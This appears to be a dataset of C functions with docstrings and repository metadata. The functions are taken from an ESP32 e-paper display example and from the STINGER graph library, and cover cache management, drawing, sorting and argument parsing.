{"docstring": "// initializes the cache\n", "func_signal": "void spiffs_cache_init(spiffs *fs)", "code": "{\n  if (fs->cache == 0) return;\n  u32_t sz = fs->cache_size;\n  u32_t cache_mask = 0;\n  int i;\n  int cache_entries =\n      (sz - sizeof(spiffs_cache)) / (SPIFFS_CACHE_PAGE_SIZE(fs));\n  if (cache_entries <= 0) return;\n\n  for (i = 0; i < cache_entries; i++) {\n    cache_mask <<= 1;\n    cache_mask |= 1;\n  }\n\n  spiffs_cache cache;\n  memset(&cache, 0, sizeof(spiffs_cache));\n  cache.cpage_count = cache_entries;\n  cache.cpages = (u8_t *)((u8_t *)fs->cache + sizeof(spiffs_cache));\n\n  cache.cpage_use_map = 0xffffffff;\n  cache.cpage_use_mask = cache_mask;\n  memcpy(fs->cache, &cache, sizeof(spiffs_cache));\n\n  spiffs_cache *c = spiffs_get_cache(fs);\n\n  memset(c->cpages, 0, c->cpage_count * SPIFFS_CACHE_PAGE_SIZE(fs));\n\n  c->cpage_use_map &= ~(c->cpage_use_mask);\n  for (i = 0; i < cache.cpage_count; i++) {\n    spiffs_get_cache_page_hdr(fs, c, i)->ix = i;\n  }\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// Used to do circles and roundrects\n//----------------------------------------------------------------------------------------------------------------\n", "func_signal": "static void fillCircleHelper(int16_t x0, int16_t y0, int16_t r,\tuint8_t cornername, int16_t delta, color_t color)", "code": "{\n\tint16_t f = 1 - r;\n\tint16_t ddF_x = 1;\n\tint16_t ddF_y = -2 * r;\n\tint16_t x = 0;\n\tint16_t y = r;\n\tint16_t ylm = x0 - r;\n\n\twhile (x < y) {\n\t\tif (f >= 0) {\n\t\t\tif (cornername & 0x1) _drawFastVLine(x0 + y, y0 - x, 2 * x + 1 + delta, color);\n\t\t\tif (cornername & 0x2) _drawFastVLine(x0 - y, y0 - x, 2 * x + 1 + delta, color);\n\t\t\tylm = x0 - y;\n\t\t\ty--;\n\t\t\tddF_y += 2;\n\t\t\tf += ddF_y;\n\t\t}\n\t\tx++;\n\t\tddF_x += 2;\n\t\tf += ddF_x;\n\n\t\tif ((x0 - x) > ylm) {\n\t\t\tif (cornername & 0x1) _drawFastVLine(x0 + x, y0 - y, 2 * y + 1 + delta, color);\n\t\t\tif (cornername & 0x2) _drawFastVLine(x0 - x, y0 - y, 2 * y + 1 + delta, color);\n\t\t}\n\t}\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// Returns the string width in pixels.\n// Useful for positions strings on the screen.\n//===============================\n", "func_signal": "int EPD_getStringWidth(char* str)", "code": "{\n    int strWidth = 0;\n\n\tif (cfont.bitmap == 2) strWidth = ((_7seg_width()+2) * strlen(str)) - 2;\t// 7-segment font\n\telse if (cfont.x_size != 0) strWidth = strlen(str) * cfont.x_size;\t\t\t// fixed width font\n\telse {\n\t\t// calculate the width of the string of proportional characters\n\t\tchar* tempStrptr = str;\n\t\twhile (*tempStrptr != 0) {\n\t\t\tif (getCharPtr(*tempStrptr++)) {\n\t\t\t\tstrWidth += (((fontChar.width > fontChar.xDelta) ? fontChar.width : fontChar.xDelta) + 1);\n\t\t\t}\n\t\t}\n\t\tstrWidth--;\n\t}\n\treturn strWidth;\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// returns cached page for give page index, or null if no such cached page\n", "func_signal": "static spiffs_cache_page *spiffs_cache_page_get(spiffs *fs, spiffs_page_ix pix)", "code": "{\n  spiffs_cache *cache = spiffs_get_cache(fs);\n  if ((cache->cpage_use_map & cache->cpage_use_mask) == 0) return 0;\n  int i;\n  for (i = 0; i < cache->cpage_count; i++) {\n    spiffs_cache_page *cp = spiffs_get_cache_page_hdr(fs, cache, i);\n    if ((cache->cpage_use_map & (1<<i)) &&\n        (cp->flags & SPIFFS_CACHE_FLAG_TYPE_WR) == 0 &&\n        cp->pix == pix ) {\n      SPIFFS_CACHE_DBG(\"CACHE_GET: have cache page \"_SPIPRIi\" for \"_SPIPRIpg\"\\n\", i, pix);\n      cp->last_access = cache->last_access;\n      return cp;\n    }\n  }\n  //SPIFFS_CACHE_DBG(\"CACHE_GET: no cache for \"_SPIPRIpg\"\\n\", pix);\n  return 0;\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// removes the oldest accessed cached page\n", "func_signal": "static s32_t spiffs_cache_page_remove_oldest(spiffs *fs, u8_t flag_mask, u8_t flags)", "code": "{\n  s32_t res = SPIFFS_OK;\n  spiffs_cache *cache = spiffs_get_cache(fs);\n\n  if ((cache->cpage_use_map & cache->cpage_use_mask) != cache->cpage_use_mask) {\n    // at least one free cpage\n    return SPIFFS_OK;\n  }\n\n  // all busy, scan thru all to find the cpage which has oldest access\n  int i;\n  int cand_ix = -1;\n  u32_t oldest_val = 0;\n  for (i = 0; i < cache->cpage_count; i++) {\n    spiffs_cache_page *cp = spiffs_get_cache_page_hdr(fs, cache, i);\n    if ((cache->last_access - cp->last_access) > oldest_val &&\n        (cp->flags & flag_mask) == flags) {\n      oldest_val = cache->last_access - cp->last_access;\n      cand_ix = i;\n    }\n  }\n\n  if (cand_ix >= 0) {\n    res = spiffs_cache_page_free(fs, cand_ix, 1);\n  }\n\n  return res;\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// frees cached page\n", "func_signal": "static s32_t spiffs_cache_page_free(spiffs *fs, int ix, u8_t write_back)", "code": "{\n  s32_t res = SPIFFS_OK;\n  spiffs_cache *cache = spiffs_get_cache(fs);\n  spiffs_cache_page *cp = spiffs_get_cache_page_hdr(fs, cache, ix);\n  if (cache->cpage_use_map & (1<<ix)) {\n    if (write_back &&\n        (cp->flags & SPIFFS_CACHE_FLAG_TYPE_WR) == 0 &&\n        (cp->flags & SPIFFS_CACHE_FLAG_DIRTY)) {\n      u8_t *mem =  spiffs_get_cache_page(fs, cache, ix);\n      res = SPIFFS_HAL_WRITE(fs, SPIFFS_PAGE_TO_PADDR(fs, cp->pix), SPIFFS_CFG_LOG_PAGE_SZ(fs), mem);\n    }\n\n    cp->flags = 0;\n    cache->cpage_use_map &= ~(1 << ix);\n\n    if (cp->flags & SPIFFS_CACHE_FLAG_TYPE_WR) {\n      SPIFFS_CACHE_DBG(\"CACHE_FREE: free cache page \"_SPIPRIi\" objid \"_SPIPRIid\"\\n\", ix, cp->obj_id);\n    } else {\n      SPIFFS_CACHE_DBG(\"CACHE_FREE: free cache page \"_SPIPRIi\" pix \"_SPIPRIpg\"\\n\", ix, cp->pix);\n    }\n  }\n\n  return res;\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//===============================================\n", "func_signal": "void EPD_clearStringRect(int x, int y, char *str)", "code": "{\n\tint w = EPD_getStringWidth(str);\n\tint h = EPD_getfontheight();\n\tEPD_fillRect(x+dispWin.x1, y+dispWin.y1, w, h, _bg);\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// Fill a triangle\n//--------------------------------------------------------------------------------------------------------------------\n", "func_signal": "static void _fillTriangle(uint16_t x0, uint16_t y0, uint16_t x1, uint16_t y1, uint16_t x2, uint16_t y2, color_t color)", "code": "{\n  int16_t a, b, y, last;\n\n  // Sort coordinates by Y order (y2 >= y1 >= y0)\n  if (y0 > y1) {\n    swap(y0, y1); swap(x0, x1);\n  }\n  if (y1 > y2) {\n    swap(y2, y1); swap(x2, x1);\n  }\n  if (y0 > y1) {\n    swap(y0, y1); swap(x0, x1);\n  }\n\n  if(y0 == y2) { // Handle awkward all-on-same-line case as its own thing\n    a = b = x0;\n    if(x1 < a)      a = x1;\n    else if(x1 > b) b = x1;\n    if(x2 < a)      a = x2;\n    else if(x2 > b) b = x2;\n    _drawFastHLine(a, y0, b-a+1, color);\n    return;\n  }\n\n  int16_t\n    dx01 = x1 - x0,\n    dy01 = y1 - y0,\n    dx02 = x2 - x0,\n    dy02 = y2 - y0,\n    dx12 = x2 - x1,\n    dy12 = y2 - y1;\n  int32_t\n    sa   = 0,\n    sb   = 0;\n\n  // For upper part of triangle, find scanline crossings for segments\n  // 0-1 and 0-2.  If y1=y2 (flat-bottomed triangle), the scanline y1\n  // is included here (and second loop will be skipped, avoiding a /0\n  // error there), otherwise scanline y1 is skipped here and handled\n  // in the second loop...which also avoids a /0 error here if y0=y1\n  // (flat-topped triangle).\n  if(y1 == y2) last = y1;   // Include y1 scanline\n  else         last = y1-1; // Skip it\n\n  for(y=y0; y<=last; y++) {\n    a   = x0 + sa / dy01;\n    b   = x0 + sb / dy02;\n    sa += dx01;\n    sb += dx02;\n    /* longhand:\n    a = x0 + (x1 - x0) * (y - y0) / (y1 - y0);\n    b = x0 + (x2 - x0) * (y - y0) / (y2 - y0);\n    */\n    if(a > b) swap(a,b);\n    _drawFastHLine(a, y, b-a+1, color);\n  }\n\n  // For lower part of triangle, find scanline crossings for segments\n  // 0-2 and 1-2.  This loop is skipped if y1=y2.\n  sa = dx12 * (y - y1);\n  sb = dx02 * (y - y0);\n  for(; y<=y2; y++) {\n    a   = x1 + sa / dy12;\n    b   = x0 + sb / dy02;\n    sa += dx12;\n    sb += dx02;\n    /* longhand:\n    a = x1 + (x2 - x1) * (y - y1) / (y2 - y1);\n    b = x0 + (x2 - x0) * (y - y0) / (y2 - y0);\n    */\n    if(a > b) swap(a,b);\n    _drawFastHLine(a, y, b-a+1, color);\n  }\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// Bresenham's algorithm - thx wikipedia - speed enhanced by Bodmer this uses\n// the eficient FastH/V Line draw routine for segments of 2 pixels or more\n//----------------------------------------------------------------------------------\n", "func_signal": "static void _drawLine(int16_t x0, int16_t y0, int16_t x1, int16_t y1, color_t color)", "code": "{\n  if (x0 == x1) {\n\t  if (y0 <= y1) _drawFastVLine(x0, y0, y1-y0, color);\n\t  else _drawFastVLine(x0, y1, y0-y1, color);\n\t  return;\n  }\n  if (y0 == y1) {\n\t  if (x0 <= x1) _drawFastHLine(x0, y0, x1-x0, color);\n\t  else _drawFastHLine(x1, y0, x0-x1, color);\n\t  return;\n  }\n\n  int steep = 0;\n  if (abs(y1 - y0) > abs(x1 - x0)) steep = 1;\n  if (steep) {\n    swap(x0, y0);\n    swap(x1, y1);\n  }\n  if (x0 > x1) {\n    swap(x0, x1);\n    swap(y0, y1);\n  }\n\n  int16_t dx = x1 - x0, dy = abs(y1 - y0);;\n  int16_t err = dx >> 1, ystep = -1, xs = x0, dlen = 0;\n\n  if (y0 < y1) ystep = 1;\n\n  // Split into steep and not steep for FastH/V separation\n  if (steep) {\n    for (; x0 <= x1; x0++) {\n      dlen++;\n      err -= dy;\n      if (err < 0) {\n        err += dx;\n        if (dlen == 1) _drawPixel(y0, xs, color);\n        else _drawFastVLine(y0, xs, dlen, color);\n        dlen = 0; y0 += ystep; xs = x0 + 1;\n      }\n    }\n    if (dlen) _drawFastVLine(y0, xs, dlen, color);\n  }\n  else\n  {\n    for (; x0 <= x1; x0++) {\n      dlen++;\n      err -= dy;\n      if (err < 0) {\n        err += dx;\n        if (dlen == 1) _drawPixel(xs, y0, color);\n        else _drawFastHLine(xs, y0, dlen, color);\n        dlen = 0; y0 += ystep; xs = x0 + 1;\n      }\n    }\n    if (dlen) _drawFastHLine(xs, y0, dlen, color);\n  }\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//------------------------------------------------\n", "func_signal": "int compile_font_file(char *fontfile, uint8_t dbg)", "code": "{\n\tint err = 0;\n\tchar err_msg[128] = {'\\0'};\n\tchar outfile[128] = {'\\0'};\n\tsize_t len;\n    struct stat sb;\n    FILE *ffd = NULL;\n    FILE *ffd_out = NULL;\n    char *sourcebuf = NULL;\n\n    len = strlen(fontfile);\n\n\t// check here that filename end with \".c\".\n\tif ((len < 3) || (len > 125) || (strcmp(fontfile + len - 2, \".c\") != 0)) {\n\t\tsprintf(err_msg, \"not a .c file\");\n\t\terr = 1;\n\t\tgoto exit;\n\t}\n\n\tsprintf(outfile, \"%s\", fontfile);\n\tsprintf(outfile+strlen(outfile)-1, \"fon\");\n\n\t// Open the source file\n    if (stat(fontfile, &sb) != 0) {\n    \tsprintf(err_msg, \"Error opening source file '%s'\", fontfile);\n    \terr = 2;\n\t\tgoto exit;\n    }\n    // Open the file\n    ffd = fopen(fontfile, \"rb\");\n    if (!ffd) {\n    \tsprintf(err_msg, \"Error opening source file '%s'\", fontfile);\n    \terr = 3;\n\t\tgoto exit;\n    }\n\n\t// Open the font file\n    ffd_out= fopen(outfile, \"wb\");\n\tif (!ffd_out) {\n\t\tsprintf(err_msg, \"error opening destination file\");\n\t\terr = 4;\n\t\tgoto exit;\n\t}\n\n\t// Get file size\n\tint fsize = sb.st_size;\n\tif (fsize <= 0) {\n\t\tsprintf(err_msg, \"source file size error\");\n\t\terr = 5;\n\t\tgoto exit;\n\t}\n\n\tsourcebuf = malloc(fsize+4);\n\tif (sourcebuf == NULL) {\n\t\tsprintf(err_msg, \"memory allocation error\");\n\t\terr = 6;\n\t\tgoto exit;\n\t}\n\tchar *fbuf = sourcebuf;\n\n\tint rdsize = fread(fbuf, 1, fsize, ffd);\n\tfclose(ffd);\n\tffd = NULL;\n\n\tif (rdsize != fsize) {\n\t\tsprintf(err_msg, \"error reading from source file\");\n\t\terr = 7;\n\t\tgoto exit;\n\t}\n\n\t*(fbuf+rdsize) = '\\0';\n\n\tfbuf = strchr(fbuf, '{');\t\t\t// beginning of font data\n\tchar *fend = strstr(fbuf, \"};\");\t// end of font data\n\n\tif ((fbuf == NULL) || (fend == NULL) || ((fend-fbuf) < 22)) {\n\t\tsprintf(err_msg, \"wrong source file format\");\n\t\terr = 8;\n\t\tgoto exit;\n\t}\n\n\tfbuf++;\n\t*fend = '\\0';\n\tchar hexstr[5] = {'\\0'};\n\tint lastline = 0;\n\n\tfbuf = strstr(fbuf, \"0x\");\n\tint size = 0;\n\tchar *nextline;\n\tchar *numptr;\n\n\tint bptr = 0;\n\n\twhile ((fbuf != NULL) && (fbuf < fend) && (lastline == 0)) {\n\t\tnextline = strchr(fbuf, '\\n'); // beginning of the next line\n\t\tif (nextline == NULL) {\n\t\t\tnextline = fend-1;\n\t\t\tlastline++;\n\t\t}\n\t\telse nextline++;\n\n\t\twhile (fbuf < nextline) {\n\t\t\tnumptr = strstr(fbuf, \"0x\");\n\t\t\tif ((numptr == NULL) || ((fbuf+4) > nextline)) numptr = strstr(fbuf, \"0X\");\n\t\t\tif ((numptr != NULL) && ((numptr+4) <= nextline)) {\n\t\t\t\tfbuf = numptr;\n\t\t\t\tif (bptr >= 128) {\n\t\t\t\t\t// buffer full, write to file\n                    if (fwrite(outfile, 1, 128, ffd_out) != 128) goto error;\n\t\t\t\t\tbptr = 0;\n\t\t\t\t\tsize += 128;\n\t\t\t\t}\n\t\t\t\tmemcpy(hexstr, fbuf, 4);\n\t\t\t\thexstr[4] = 0;\n\t\t\t\toutfile[bptr++] = (uint8_t)strtol(hexstr, NULL, 0);\n\t\t\t\tfbuf += 4;\n\t\t\t}\n\t\t\telse fbuf = nextline;\n\t\t}\n\t\tfbuf = nextline;\n\t}\n\n\tif (bptr > 0) {\n\t\tsize += bptr;\n        if (fwrite(outfile, 1, bptr, ffd_out) != bptr) goto error;\n\t}\n\n\t// write font ID\n\tsprintf(outfile, \"RPH_font\");\n    if (fwrite(outfile, 1, 8, ffd_out) != 8) goto error;\n\n\t// === Test compiled font ===\n\tsprintf(outfile, \"%s\", fontfile);\n\tsprintf(outfile+strlen(outfile)-1, \"fon\");\n\n\tuint8_t *uf = userfont; // save userfont pointer\n\tuserfont = NULL;\n\tif (load_file_font(outfile, 1) == 0) {\n\t\tsprintf(err_msg, \"Error compiling file!\");\n\t}\n\telse {\n\t\tfree(userfont);\n\t\tsprintf(err_msg, \"File compiled successfully.\");\n\t}\n\tuserfont = uf; // restore userfont\n\n\tgoto exit;\n\nerror:\n\tsprintf(err_msg, \"error writing to destination file\");\n\terr = 9;\n\nexit:\n\tif (sourcebuf) free(sourcebuf);\n\tif (ffd) fclose(ffd);\n\tif (ffd_out) fclose(ffd_out);\n\n\tif (dbg) printf(\"%s\\r\\n\", err_msg);\n\n\treturn err;\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//-------------------------------------------------------------------------\n", "func_signal": "static void EPD_pushColorRep(int x1, int y1, int x2, int y2, color_t color)", "code": "{\n\tif (_gs == 0) color &= 0x01;\n\telse color &= 0x0F;\n\tfor (int y=y1; y<=y2; y++) {\n\t\tfor (int x = x1; x<=x2; x++){\n\t\t\tdrawPixel(x, y, color);\n\t\t}\n\t}\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// Set max width & height of the proportional font\n//-----------------------------\n", "func_signal": "static void getMaxWidthHeight()", "code": "{\n\tuint16_t tempPtr = 4; // point at first char data\n\tuint8_t cc, cw, ch, cd, cy;\n\n\tcfont.numchars = 0;\n\tcfont.max_x_size = 0;\n\n    cc = cfont.font[tempPtr++];\n    while (cc != 0xFF)  {\n    \tcfont.numchars++;\n        cy = cfont.font[tempPtr++];\n        cw = cfont.font[tempPtr++];\n        ch = cfont.font[tempPtr++];\n        tempPtr++;\n        cd = cfont.font[tempPtr++];\n        cy += ch;\n\t\tif (cw > cfont.max_x_size) cfont.max_x_size = cw;\n\t\tif (cd > cfont.max_x_size) cfont.max_x_size = cd;\n\t\tif (ch > cfont.y_size) cfont.y_size = ch;\n\t\tif (cy > cfont.y_size) cfont.y_size = cy;\n\t\tif (cw != 0) {\n\t\t\t// packed bits\n\t\t\ttempPtr += (((cw * ch)-1) / 8) + 1;\n\t\t}\n\t    cc = cfont.font[tempPtr++];\n\t}\n    cfont.size = tempPtr;\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "/**\n* @brief A basic counting sort\n*\n* @param array Input array of numbers to be sorted\n* @param num Number of items to be sorted\n* @param size Size of each item in array[]\n*/\n", "func_signal": "void\ncounting_sort (int64_t * array, size_t num, size_t size)", "code": "{\n  int64_t i, min, max;\n\n  min = max = array[0];\n\n  for (i = size; i < num * size; i += size) {\n    if (array[i] < min)\n      min = array[i];\n    else if (array[i] > max)\n      max = array[i];\n  }\n\n  int range = max - min + 1;\n  int64_t *count = xmalloc (range * sizeof (int64_t));\n\n  for (i = 0; i < range; i++)\n    count[i] = 0;\n\n  for (i = 0; i < num * size; i += size)\n    count[array[i] - min]++;\n\n  int64_t j, z = 0;\n  for (i = min; i <= max; i++)\n    for (j = 0; j < count[i - min]; j++)\n      array[z++] = i;\n\n  free (count);\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief A radix sort for edge tuples\n*\n* This function replaces the bucket_sort_pairs() in STINGER.\n*\n* @param x Input array of tuples sort\n* @param length Number of tuples to sort\n* @param numBits Number of bits to use for the radix\n*/\n", "func_signal": "void radix_sort_pairs (int64_t *x, int64_t length, int64_t numBits)", "code": "{\n  int64_t max, min;\n  int64_t numBuckets = 1 << numBits;\n  int64_t bitMask = numBuckets - 1;\n  int64_t * buckets = xmalloc ( (numBuckets + 2) * sizeof(int64_t));\n  int64_t * copy1 = xmalloc ( length * sizeof(int64_t));\n  int64_t * copy2 = xmalloc ( length * sizeof(int64_t));\n  int64_t * tmp;\n\n  assert(length % 2 == 0);\n\n  max = x[1];\n  min = x[1];\n  for (int64_t i = 0; i < length; i+=2) {\n    copy1[i] = x[i];\n    copy1[i+1] = x[i+1];\n    if (max < x[i+1]) {\n      max = x[i+1];\n    }\n    if (min > x[i+1]) {\n      min = x[i+1];\n    }\n  }\n  min = -min;\n  max += min;\n\n  for (int64_t i = 0; i < length; i+=2)\n  {\n    copy1[i+1] += min;\n  }\n\n  int64_t denShift = 0;\n  for (int64_t i = 0; max != 0; max = max / numBuckets, i++)\n  {\n    for (int64_t j = 0; j < numBuckets + 2; j++)\n    {\n      buckets[j] = 0;\n    }\n\n    buckets += 2;\n\n    for (int64_t j = 0; j < length; j+=2)\n    {\n      int64_t myBucket = (int64_t) ((copy1[j+1]) >> denShift) & bitMask;\n      assert (myBucket >= 0);\n      assert (myBucket < numBuckets);\n      stinger_int64_fetch_add (&buckets[myBucket], 2);\n    }\n\n    for (int64_t j = 1; j < numBuckets; j++)\n    {\n      buckets[j] += buckets[j-1];\n    }\n\n    buckets--;\n\n    for (int64_t j = 0; j < length; j+=2)\n    {\n      int64_t myBucket = (int64_t) ((copy1[j+1]) >> denShift) & bitMask;\n      int64_t index = stinger_int64_fetch_add (&buckets[myBucket], 2);\n      copy2[index] = copy1[j];\n      copy2[index+1] = copy1[j+1];\n    }\n\n    buckets--;\n    denShift += numBits;\n\n    tmp = copy1;\n    copy1 = copy2;\n    copy2 = tmp;\n  }\n\n  max = copy1[0];\n  for (int64_t i = 0; i < length; i+=2) {\n    if (max < copy1[i]) {\n      max = copy1[i];\n    }\n  }\n\n  denShift = 0;\n  for (int64_t i = 0; max != 0; max = max / numBuckets, i++)\n  {\n    for (int64_t j = 0; j < numBuckets + 2; j++)\n    {\n      buckets[j] = 0;\n    }\n\n    buckets += 2;\n\n    for (int64_t j = 0; j < length; j+=2)\n    {\n      int64_t myBucket = (int64_t) (copy1[j] >> denShift) & bitMask;\n      stinger_int64_fetch_add (&buckets[myBucket], 2);\n    }\n\n    for (int64_t j = 1; j < numBuckets; j++)\n    {\n      buckets[j] += buckets[j-1];\n    }\n\n    buckets--;\n\n    for (int64_t j = 0; j < length; j+=2)\n    {\n      int64_t myBucket = (int64_t) (copy1[j] >> denShift) & bitMask;\n      int64_t index = stinger_int64_fetch_add (&buckets[myBucket], 2);\n      copy2[index] = copy1[j];\n      copy2[index+1] = copy1[j+1];\n    }\n\n    buckets--;\n    denShift += numBits;\n\n    tmp = copy1;\n    copy1 = copy2;\n    copy2 = tmp;\n  }\n\n\n  for (int64_t i = 0; i < length; i+=2)\n  {\n    copy1[i+1] -= min;\n  }\n\n  for (int64_t i = 0; i < length; i++)\n  {\n    x[i] = copy1[i];\n  }\n\n  free(copy2);\n  free(copy1);\n  free(buckets);\n\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* INDEGREE */\n", "func_signal": "inline vdegree_t\nstinger_vertex_indegree_get(const stinger_vertices_t * vertices, vindex_t v)", "code": "{\n  if (v >= vertices->max_vertices || v < 0) {\n    return -1;\n  }\n  return VTX(v)->inDegree;\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "// BROKEN now that direction is required on each edge\n", "func_signal": "void\nedge_list_to_csr (int64_t nv, int64_t ne,\n                  int64_t * sv1, int64_t * ev1, int64_t * w1, int64_t * timeRecent, int64_t * timeFirst,\n                  int64_t * ev2, int64_t * w2, int64_t * offset, int64_t * t2, int64_t * t1)", "code": "{\n  int64_t i;\n\n  OMP (\"omp parallel for\")\n    for (i = 0; i < nv + 2; i++)\n      offset[i] = 0;\n\n  offset += 2;\n\n  /* Histogram source vertices for outer sort */\n  OMP (\"omp parallel for\")\n    for (i = 0; i < ne; i++)\n      stinger_int64_fetch_add (&offset[sv1[i]], 1);\n\n  /* Compute offset index of each bucket */\n  for (i = 1; i < nv; i++)\n    offset[i] += offset[i - 1];\n\n  offset--;\n\n  if(timeRecent && timeFirst) {\n    OMP (\"omp parallel for\") \n    for (i = 0; i < ne; i++) {\n      int64_t index = stinger_int64_fetch_add (&offset[sv1[i]], 1);\n      ev2[index] = ev1[i];\n      w2[index] = w1[i];\n      t1[index] = timeFirst[i];\n      t2[index] = timeRecent[i];\n    }\n  } else {\n    OMP (\"omp parallel for\") \n    for (i = 0; i < ne; i++) {\n      int64_t index = stinger_int64_fetch_add (&offset[sv1[i]], 1);\n      ev2[index] = ev1[i];\n      w2[index] = w1[i];\n    }\n  }\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ *\n * STINGER VERTICES\n * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */\n", "func_signal": "inline stinger_vertices_t *\nstinger_vertices_new(int64_t max_vertices)", "code": "{\n  stinger_vertices_t * rtn = xcalloc(1, sizeof(stinger_vertices_t) + max_vertices * sizeof(stinger_vertex_t));\n  rtn->max_vertices = max_vertices;\n  return rtn;\n}", "path": "lib\\stinger_core\\src\\stinger_vertex.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief Tests if the string is less than 255 characters and contains only _, a-z, A-Z, 0-9\n*\n* @param name The string.\n* @param length The length of the string.\n*\n* @return 1 if the string is \"simple\", 0 otherwise\n*/\n", "func_signal": "int\nis_simple_name(const char * name, int64_t length)", "code": "{\n  if(length > 254)\n    return 0;\n\n  for(int64_t i = 0; i < length; i++) {\n    char c = name[i];\n    if(!(\n      (c >= 'a' && c <= 'z') ||\n      (c >= 'A' && c <= 'Z') ||\n      (c >= '0' && c <= '9') ||\n      c == '_'))\n      return 0;\n  }\n\n  return 1;\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n* @brief Parses command line arguments.\n*\n* Parses the command line input as given by usage().  Batch size, number of\n* batches, initial graph filename, and action stream filename are given by\n* to the caller if they were specified on the command line.\n*\n* @param argc The number of arguments\n* @param argv[] The array of arguments\n* @param initial_graph_name Path/filename of the initial input graph on disk\n* @param action_stream_name Path/filename of the action stream on disk\n* @param batch_size Number of edge actions to consider in one batch\n* @param nbatch Number of batchs to process\n*/\n", "func_signal": "void\nparse_args (const int argc, char *argv[],\n            char **initial_graph_name, char **action_stream_name,\n            int64_t * batch_size, int64_t * nbatch)", "code": "{\n  int k = 1;\n  int seen_batch = 0, seen_nbatch = 0;\n  if (k >= argc)\n    return;\n  while (k < argc && argv[k][0] == '-') {\n    if (0 == strcmp (argv[k], \"--batch\") || 0 == strcmp (argv[k], \"-b\")) {\n      if (seen_batch)\n        goto err;\n      seen_batch = 1;\n      ++k;\n      if (k >= argc)\n        goto err;\n      *batch_size = strtol (argv[k], NULL, 10);\n      if (batch_size <= 0)\n        goto err;\n      ++k;\n    } else if (0 == strcmp (argv[k], \"--num-batches\")\n             || 0 == strcmp (argv[k], \"-n\")) {\n      if (seen_nbatch)\n        goto err;\n      seen_nbatch = 1;\n      ++k;\n      if (k >= argc)\n        goto err;\n      *nbatch = strtol (argv[k], NULL, 10);\n      if (nbatch < 0)\n        goto err;\n      ++k;\n    } else if (0 == strcmp (argv[k], \"--help\")\n             || 0 == strcmp (argv[k], \"-h\") || 0 == strcmp (argv[k], \"-?\")) {\n      usage (stdout, argv[0]);\n      exit (EXIT_SUCCESS);\n      return;\n    } else if (0 == strcmp (argv[k], \"--\")) {\n      ++k;\n      break;\n    }\n  }\n  if (k < argc)\n    *initial_graph_name = argv[k++];\n  if (k < argc)\n    *action_stream_name = argv[k++];\n  return;\n err:\n  usage (stderr, argv[0]);\n  exit (EXIT_FAILURE);\n  return;\n}", "path": "lib\\stinger_utils\\src\\stinger_utils.c", "repo_name": "stingergraph/stinger", "stars": 206, "license": "other", "language": "c", "size": 15983}
{"docstring": "/**\n * Returns the size of physical memory (RAM) in bytes.\n */\n", "func_signal": "size_t getMemorySize( )", "code": "{\n#if defined(_WIN32) && (defined(__CYGWIN__) || defined(__CYGWIN32__))\n\t/* Cygwin under Windows. ------------------------------------ */\n\t/* New 64-bit MEMORYSTATUSEX isn't available.  Use old 32.bit */\n\tMEMORYSTATUS status;\n\tstatus.dwLength = sizeof(status);\n\tGlobalMemoryStatus( &status );\n\treturn (size_t)status.dwTotalPhys;\n\n#elif defined(_WIN32)\n\t/* Windows. ------------------------------------------------- */\n\t/* Use new 64-bit MEMORYSTATUSEX, not old 32-bit MEMORYSTATUS */\n\tMEMORYSTATUSEX status;\n\tstatus.dwLength = sizeof(status);\n\tGlobalMemoryStatusEx( &status );\n\treturn (size_t)status.ullTotalPhys;\n\n#elif defined(__unix__) || defined(__unix) || defined(unix) || (defined(__APPLE__) && defined(__MACH__))\n\t/* UNIX variants. ------------------------------------------- */\n\t/* Prefer sysctl() over sysconf() except sysctl() 